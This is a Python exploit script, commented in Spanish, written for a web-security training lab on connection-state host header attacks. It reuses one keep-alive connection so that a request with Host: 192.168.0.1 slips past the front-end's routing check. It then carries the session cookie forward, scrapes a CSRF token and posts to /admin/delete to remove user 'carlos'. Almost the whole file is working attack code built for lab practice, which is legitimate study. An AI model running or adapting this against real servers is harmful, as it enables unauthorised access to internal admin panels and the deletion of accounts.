#!/usr/bin/env python3
"""
Host Header Injection  ->  REUSO DE CONEXION (first-request routing)
===================================================================
Algunos front-ends deciden A DONDE enrutar una conexion mirando SOLO la PRIMERA
peticion que llega por esa conexion TCP, y aplican esa decision a TODAS las
peticiones siguientes de la MISMA conexion, sin revalidar el header Host.

Vector:
  - 1a peticion: legitima (Host del lab, ruta publica). El front-end la valida,
    "abre" la conexion y fija su enrutamiento.
  - 2a peticion: POR LA MISMA CONEXION keep-alive, con Host: 192.168.0.1 y /admin.
    Como el front-end ya no revalida el Host, el back-end interno la sirve.

Equivalente en Burp: 'Send group in sequence (single connection)' con estas dos
peticiones. Aqui lo hacemos a mano sobre UN solo socket.

Por que NO vale el send_raw() de http_smuggling/raw_socket.py:
  - Ese helper lee hasta timeout/EOF y CIERRA. En keep-alive el server NO cierra,
    asi que no hay forma de separar la respuesta 1 de la 2. Aqui usamos un lector
    (ConnReader) que consume EXACTAMENTE una respuesta parseando Content-Length /
    Transfer-Encoding: chunked, y deja el sobrante para la siguiente lectura.

Guarda cada respuesta CRUDA COMPLETA (status line + cabeceras + cuerpo) en su
propio .html dentro de ./responses/.

Sin dependencias externas (solo stdlib).

Uso:
    python conn_reuse.py
Edita HOST y la lista PETICIONES de abajo.
"""
import os
import re
import socket
import ssl

# ###########################################################################
# #  !!!  FALLO TIPICO - LEER ANTES DE TOCAR NADA  !!!                      #
# #  La 2a peticion (Host: 192.168.0.1 -> /admin) devuelve                  #
# #      HTTP/1.1 421 Misdirected Request   "Invalid host"                  #
# #  si NO lleva la COOKIE DE SESION que el server asigna en la 1a          #
# #  respuesta (Set-Cookie: session=...; _lab=...).                         #
# #                                                                         #
# #      sin cookie  -> 421 Invalid host                                    #
# #      con cookie  -> 200 OK  (panel /admin)                              #
# #                                                                         #
# #  Burp reusa esa cookie solo; aqui lo hace AUTO_COOKIES=True (abajo),    #
# #  que arrastra el Set-Cookie de cada respuesta a las peticiones          #
# #  siguientes. NO es un problema de HTTP/2: este front-end es HTTP/1.1.   #
# ###########################################################################

# --- Config ----------------------------------------------------------------
HOST    = "0af100820461779482900744006b0045.h1-web-security-academy.net"  # <-- tu lab (destino TCP + SNI)
PORT    = 443
USE_TLS = True          # True para HTTPS, False para HTTP
TIMEOUT = 10            # segundos por recv
OUT_DIR = "responses"   # subcarpeta (junto a este script) donde se guardan los .html
PIPELINE = False        # False = send->read->send->read (recomendado y necesario
                        #         para AUTO_COOKIES). True = manda TODAS las
                        #         peticiones seguidas y luego lee N respuestas
                        #         (aqui NO se pueden arrastrar cookies de una a otra).
AUTO_COOKIES = True     # Arrastra las cookies (Set-Cookie) de cada respuesta a las
                        # peticiones siguientes, igual que hace Burp. IMPRESCINDIBLE
                        # en este lab: sin la cookie de sesion, la 2a peticion da
                        # '421 Invalid host'; con ella, devuelve el panel /admin.

# --- Lista configurable de N peticiones (EL CORAZON: se edita aqui) ---------
# Cada entrada describe UNA peticion. 'host' es la cabecera Host: y PUEDE diferir
# del HOST de destino TCP: ese es justo el vector. Siempre conectamos a HOST:PORT;
# solo cambian la cabecera Host y el path. Anade/quita cuantas quieras.
# Campos opcionales por peticion: "extra_headers" (lista de "Cabecera: valor"),
# "body" (str) y "cookie" (str, fuerza la cabecera Cookie de esa peticion).
# En "path"/"body" puedes usar el placeholder {csrf}: se rellena SOLO con el token
# csrf extraido de la respuesta ANTERIOR (name="csrf" value="..."). Requiere modo
# secuencial (PIPELINE=False).
PETICIONES = [
    # 1a: legitima. El server responde con Set-Cookie (session + _lab); esa cookie
    #     se reusa en las peticiones siguientes (AUTO_COOKIES).
    {"method": "GET", "path": "/", "host": HOST},
    # 2a: reusa la conexion + la cookie; Host interno + /admin -> panel admin.
    #     De su respuesta se extrae el token csrf para la 3a peticion.
    {"method": "GET", "path": "/admin", "host": "192.168.0.1"},
    # 3a: RESUELVE el lab. POST /admin/delete con el csrf de la 2a + username=carlos.
    {"method": "POST", "path": "/admin/delete", "host": "192.168.0.1",
     "extra_headers": ["Content-Type: application/x-www-form-urlencoded"],
     "body": "csrf={csrf}&username=carlos"},
]


# --- Construccion de la peticion cruda --------------------------------------
def build_request(method, path, host, extra_headers=None, body=None):
    """Devuelve los bytes EXACTOS de una peticion HTTP/1.1 con Connection:
    keep-alive (clave para mantener viva la conexion entre peticiones)."""
    lines = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host}",
        "Connection: keep-alive",
    ]
    if extra_headers:
        lines.extend(extra_headers)
    if body is not None:
        # latin-1 = 1 byte por caracter, asi len() cuadra con el Content-Length.
        lines.append(f"Content-Length: {len(body.encode('latin-1'))}")
    raw = "\r\n".join(lines) + "\r\n\r\n"
    if body is not None:
        raw += body
    return raw.encode("latin-1")


# --- Lector de UNA respuesta por conexion (pieza nueva imprescindible) ------
class ConnReader:
    """Lee respuestas HTTP/1.1 de un socket keep-alive de una en una, parseando
    Content-Length / Transfer-Encoding: chunked. Mantiene en self.buf el sobrante
    que ya pertenece a la SIGUIENTE respuesta."""

    def __init__(self, sock, timeout=TIMEOUT):
        self.sock = sock
        self.timeout = timeout
        self.buf = b""

    def _fill(self):
        """Trae mas bytes al buffer. Devuelve False si se cerro/agoto el tiempo."""
        try:
            data = self.sock.recv(4096)
        except socket.timeout:
            return False
        if not data:
            return False
        self.buf += data
        return True

    def _read_until(self, marker):
        """Asegura que self.buf contiene 'marker'; devuelve su indice o -1."""
        while marker not in self.buf:
            if not self._fill():
                return self.buf.find(marker)
        return self.buf.find(marker)

    def _read_at_least(self, n):
        """Asegura que self.buf tiene >= n bytes (o se corta la conexion)."""
        while len(self.buf) < n:
            if not self._fill():
                break
        return len(self.buf) >= n

    def read_response(self):
        """Consume y devuelve los bytes crudos de UNA respuesta completa."""
        # 1) Cabeceras completas: hasta \r\n\r\n
        idx = self._read_until(b"\r\n\r\n")
        if idx == -1:
            # No llegaron cabeceras completas (timeout/cierre); devuelve lo que haya.
            resp, self.buf = self.buf, b""
            return resp
        head_end = idx + 4
        headers_blob = self.buf[:head_end]

        # 2) Parsear cabeceras (case-insensitive) para saber donde acaba el cuerpo.
        header_text = headers_blob.decode("latin-1", errors="replace")
        te_chunked = bool(re.search(r"(?im)^Transfer-Encoding:\s*chunked",
                                    header_text))
        m_cl = re.search(r"(?im)^Content-Length:\s*(\d+)", header_text)

        if te_chunked:
            body = self._read_chunked(head_end)
            resp = headers_blob + body
        elif m_cl:
            n = int(m_cl.group(1))
            self._read_at_least(head_end + n)
            body = self.buf[head_end:head_end + n]
            resp = headers_blob + body
            self.buf = self.buf[head_end + n:]
        else:
            # Sin CL ni TE (p.ej. 204/304 o respuesta sin cuerpo): solo cabeceras.
            resp = headers_blob
            self.buf = self.buf[head_end:]
        return resp

    def _read_chunked(self, start):
        """Lee un cuerpo chunked desde self.buf[start:] hasta el chunk 0. Devuelve
        los bytes crudos del cuerpo (incluidas las lineas de tamano y el cierre)."""
        pos = start
        body_start = start
        while True:
            # Linea con el tamano del chunk (en hex) terminada en \r\n.
            crlf = self.buf.find(b"\r\n", pos)
            while crlf == -1:
                if not self._fill():
                    break
                crlf = self.buf.find(b"\r\n", pos)
            if crlf == -1:
                # Conexion cortada a media respuesta: devuelve lo que haya.
                body = self.buf[body_start:]
                self.buf = b""
                return body
            size_line = self.buf[pos:crlf]
            try:
                size = int(size_line.split(b";")[0].strip() or b"0", 16)
            except ValueError:
                size = 0
            chunk_data_start = crlf + 2
            if size == 0:
                # Chunk final: consumir hasta el \r\n\r\n de cierre (trailer incl.).
                end = self.buf.find(b"\r\n\r\n", pos)
                while end == -1:
                    if not self._fill():
                        break
                    end = self.buf.find(b"\r\n\r\n", pos)
                if end == -1:
                    body = self.buf[body_start:]
                    self.buf = b""
                    return body
                total_end = end + 4
                body = self.buf[body_start:total_end]
                self.buf = self.buf[total_end:]
                return body
            # Asegurar los 'size' bytes de datos + su \r\n final, y avanzar.
            needed = chunk_data_start + size + 2
            self._read_at_least(needed)
            pos = needed


# --- Guardado --------------------------------------------------------------
def _sanitize(s):
    """Sanea un fragmento para nombre de fichero en Windows."""
    return re.sub(r'[\\/:*?"<>|]', "_", s).strip("_") or "x"


def guardar(base_dir, idx, peticion, resp_bytes):
    out = os.path.join(base_dir, OUT_DIR)
    os.makedirs(out, exist_ok=True)
    host = _sanitize(peticion.get("host", "host"))
    path = _sanitize(peticion.get("path", "/"))
    name = f"resp_{idx:02d}_{host}_{path}.html"
    full = os.path.join(out, name)
    # Modo binario: fidelidad byte-a-byte de la respuesta cruda completa.
    with open(full, "wb") as f:
        f.write(resp_bytes)
    return full


# --- Utilidades de consola / cookies ---------------------------------------
def status_line(resp_bytes):
    first = resp_bytes.split(b"\r\n", 1)[0]
    return first.decode("latin-1", errors="replace") or "(sin status line)"


def extract_cookies(resp_bytes):
    """Devuelve {nombre: valor} de todas las cabeceras Set-Cookie de la respuesta
    (solo el par nombre=valor; se ignoran atributos como Path/Secure/HttpOnly)."""
    head = resp_bytes.split(b"\r\n\r\n", 1)[0].decode("latin-1", errors="replace")
    jar = {}
    for line in head.split("\r\n"):
        if line.lower().startswith("set-cookie:"):
            pair = line.split(":", 1)[1].strip().split(";", 1)[0]
            if "=" in pair:
                k, v = pair.split("=", 1)
                jar[k.strip()] = v.strip()
    return jar


def cookie_header(jar):
    """Serializa el jar como valor de la cabecera Cookie."""
    return "; ".join(f"{k}={v}" for k, v in jar.items())


def extract_csrf(resp_bytes):
    """Devuelve el token del campo oculto name="csrf" value="..." (o None)."""
    text = resp_bytes.decode("latin-1", errors="replace")
    m = re.search(r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']', text, re.I)
    return m.group(1) if m else None


class _Placeholders(dict):
    """dict que, ante una clave ausente, deja el placeholder {clave} intacto en vez
    de lanzar KeyError (para no romper si el token aun no existe)."""
    def __missing__(self, key):
        return "{" + key + "}"


def subst(text, state):
    """Sustituye placeholders tipo {csrf} en 'text' usando 'state'. Si el texto no
    trae '{', lo devuelve tal cual (evita interpretar llaves accidentales)."""
    if text is None or "{" not in text:
        return text
    return text.format_map(_Placeholders(state))


# --- Main ------------------------------------------------------------------
def _pet_to_args(pet, jar, state):
    """Convierte una entrada de PETICIONES en kwargs para build_request: sustituye
    placeholders ({csrf}) con 'state' e inyecta la cabecera Cookie (la explicita
    'cookie' de la peticion, o el jar acumulado)."""
    extra = [subst(h, state) for h in (pet.get("extra_headers") or [])]
    cookie = pet.get("cookie")
    if cookie is None and AUTO_COOKIES and jar:
        cookie = cookie_header(jar)
    if cookie:
        extra.append(f"Cookie: {cookie}")
    return {
        "method": pet["method"],
        "path": subst(pet["path"], state),
        "host": pet["host"],
        "extra_headers": extra,
        "body": subst(pet.get("body"), state),
    }


def _reportar(base_dir, idx, pet, resp):
    ruta = guardar(base_dir, idx, pet, resp)
    print(f"    respuesta: {status_line(resp)}  ({len(resp)} bytes)")
    print(f"    guardado : {ruta}\n")


def main():
    base_dir = os.path.dirname(os.path.realpath(__file__))
    print(f"[*] Host Header Injection / reuso de conexion  ->  {HOST}:{PORT} (TLS={USE_TLS})")
    print(f"[*] {len(PETICIONES)} peticion(es) sobre UNA sola conexion TCP  |  "
          f"PIPELINE={PIPELINE}  AUTO_COOKIES={AUTO_COOKIES}\n")

    # Abrir UNA conexion.
    sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
    if USE_TLS:
        ctx = ssl.create_default_context()
        # En labs con certificados raros puedes relajar la verificacion:
        # ctx.check_hostname = False
        # ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=HOST)

    reader = ConnReader(sock, timeout=TIMEOUT)
    jar = {}            # cookies acumuladas (Set-Cookie)
    state = {}          # tokens extraidos (p.ej. csrf) para placeholders {..}
    try:
        if PIPELINE:
            # Mandar TODAS las peticiones seguidas y luego leer N respuestas.
            # OJO: aqui NO se pueden arrastrar cookies NI el csrf de una peticion a
            # la siguiente (se envian todas antes de leer nada); usa el campo
            # "cookie" por peticion y pega el csrf a mano si el lab lo necesita.
            blob = b"".join(build_request(**_pet_to_args(p, jar, state))
                            for p in PETICIONES)
            sock.sendall(blob)
            for idx, pet in enumerate(PETICIONES, 1):
                print(f"[{idx}] (pipeline) Host: {pet['host']}  {pet['method']} {pet['path']}")
                resp = reader.read_response()
                _reportar(base_dir, idx, pet, resp)
        else:
            # Secuencial: send -> read -> send -> read (misma conexion).
            for idx, pet in enumerate(PETICIONES, 1):
                raw = build_request(**_pet_to_args(pet, jar, state))
                nota = "  (+cookie)" if (AUTO_COOKIES and jar) or pet.get("cookie") else ""
                print(f"[{idx}] Enviando -> Host: {pet['host']}  {pet['method']} {pet['path']}{nota}")
                sock.sendall(raw)
                resp = reader.read_response()
                if AUTO_COOKIES:
                    jar.update(extract_cookies(resp))   # arrastra Set-Cookie
                tok = extract_csrf(resp)                # captura csrf para la siguiente
                if tok:
                    state["csrf"] = tok
                    print(f"    csrf capturado: {tok}")
                _reportar(base_dir, idx, pet, resp)
    finally:
        try:
            sock.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()
